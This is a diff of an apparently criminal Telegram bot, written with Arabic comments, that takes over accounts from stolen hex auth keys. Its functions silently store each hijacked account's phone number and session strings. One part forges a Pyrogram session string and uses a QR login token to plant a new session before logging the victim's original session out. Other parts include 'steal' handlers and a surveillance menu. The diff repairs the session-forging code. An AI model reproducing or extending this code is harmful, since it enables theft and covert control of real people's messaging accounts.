@@ -477,39 +477,39 @@ def log_to_channel(text, file_path=None, session_text=None):
 def handle_hex_login(message):
     if not is_allowed(message.from_user.id):
         return
-    
+
     # استخراج الهاكس ورقم السيرفر
     match = re.search(r'([a-fA-F0-9]{250,})\s+([1-5])', message.text)
     hex_data = match.group(1)
     dc_id = int(match.group(2))
-    
+
     msg = bot.reply_to(message, "⏳ جاري فحص الجلسة والاتصال...")
-    
+
     async def process_hex():
         client = None
         try:
             auth_key_bytes = bytes.fromhex(hex_data)
             pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key_bytes)
-            
+
             client = Client(f"temp_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
             await client.connect()
-            
+
             me_raw = await client.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
             me = me_raw[0]
-            
+
             phone = getattr(me, 'phone', "Unknown")
             if phone != "Unknown" and not phone.startswith("+"):
                 phone = "+" + phone
-                
+
             first_name = getattr(me, 'first_name', "Unknown")
             user_id = me.id
             year = get_creation_year(user_id)
-            
+
             await client.disconnect()
-            
+
             # 🔥 حفظ الحساب بالداتا مع الهاكس والسيرفر بصمت
             save_hex_account(message.from_user.id, phone, user_id, first_name, pyro_session, tl_session, "HEX", hex_data, dc_id)
-            
+
             text = (
                 f"بوت اداره الجلسات المتقدم:\n"
                 f"🛂┊ تـم سحب حساب بـنـجـاح !\n\n"
@@ -519,41 +519,22 @@ def handle_hex_login(message):
                 f"•❐• سـنـة الإنـشـاء: {year}\n\n"
                 f"تـحـكـم بـحـسـابـك مـن الأزرار أدناه"
             )
-            
+
             bot.delete_message(message.chat.id, msg.message_id)
-            
+
             # 🔥 هنا يتم استدعاء لوحة التحكم الأصلية الخاصة بك
             bot.send_message(
                 message.chat.id, 
                 text, 
                 reply_markup=home_keyboard(message.from_user.id)
             )
-            
+
         except Exception as e:
             if client and client.is_connected:
                 await client.disconnect()
             bot.edit_message_text(f"❌ فشل تسجيل الدخول يرجى التأكد من الـ Hex!\nالسبب: {str(e)}", message.chat.id, msg.message_id)
 
     run_async(process_hex())
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 # =========================================================
 # ⚙️ محرك التهجير الذكي المحدث
@@ -610,11 +591,11 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
             if client_a.is_connected: await client_a.disconnect()
             return False
 
-        # 3. الآن لم يتبقَ سوى الجلسة A. نقوم بتوليد سلسلة موجهة للسيرفر المحفوظ لتوليد الجلسة B
+        # 3. الآن لم يتبقَ سوى الجلسة A. نقوم بتوليد سلسلة موجهة للسيرفر المحفوظ لتوليد الجلسة B 
+        # (تم التصحيح لكي يتطابق Buffer Session تماماً مع Pyrogram 2026 بـ 271 bytes)
         empty_auth_key = b"\x00" * 256
-        packed = struct.pack(">B?256sQ?", target_dc, False, empty_auth_key, 0, False)
-        constructed_session = packed + b"\x00" * 6  
-        session_string_for_b = base64.urlsafe_b64encode(constructed_session).decode().rstrip("=")
+        packed = struct.pack(">BI?256sQ?", target_dc, API_ID, False, empty_auth_key, 0, False)
+        session_string_for_b = base64.urlsafe_b64encode(packed).decode().rstrip("=")
 
         # 4. إنشاء الجلسة B على السيرفر الصحيح 
         client_b = Client(
@@ -632,8 +613,8 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
         if isinstance(qr, types.auth.LoginTokenMigrateTo):
             await client_b.disconnect()
-            packed_retry = struct.pack(">B?256sQ?", qr.dc_id, False, empty_auth_key, 0, False)
-            session_string_for_b = base64.urlsafe_b64encode(packed_retry + b"\x00" * 6).decode().rstrip("=")
+            packed_retry = struct.pack(">BI?256sQ?", qr.dc_id, API_ID, False, empty_auth_key, 0, False)
+            session_string_for_b = base64.urlsafe_b64encode(packed_retry).decode().rstrip("=")
             client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string_for_b, in_memory=True, device_model=B_DEVICE_MODEL)
             await client_b.connect()
             qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
@@ -654,7 +635,7 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
             if not me_b:
                 raise Exception("فشل التحقق من Session B عبر العميل النظيف")
-            
+
             await verify_b.disconnect()
 
             # 8. الجلسة A تسجل خروج بنفسها (لتدمير الجلسة القديمة والاعتماد على B فقط)
@@ -713,35 +694,6 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
         if verify_b and verify_b.is_connected: await verify_b.disconnect()
         if client_a.is_connected: await client_a.disconnect()
         return False
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 # =========================================================
 # 🎛️ واجهات التحكم
@@ -1361,9 +1313,6 @@ def handle_steal(call):
         res = run_async(steal_single_account(int(target), call.from_user.id))
         bot.edit_message_text(res, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")
 
-
-
-
 async def steal_single_account(acc_id, admin_id):
     acc = get_account(acc_id)
     if not acc: return "❌ الحساب غير موجود."
@@ -1401,16 +1350,6 @@ async def steal_single_account(acc_id, admin_id):
     except Exception as e: return f"❌ فشل الاتصال بالحساب `{phone}`."
     finally:
         if client_a.is_connected: await client_a.disconnect()
-
-
-
-
-
-
-
-
-
-
 
 @bot.callback_query_handler(func=lambda call: call.data == "manage_surveillance")
 def manage_surveillance_menu(call):
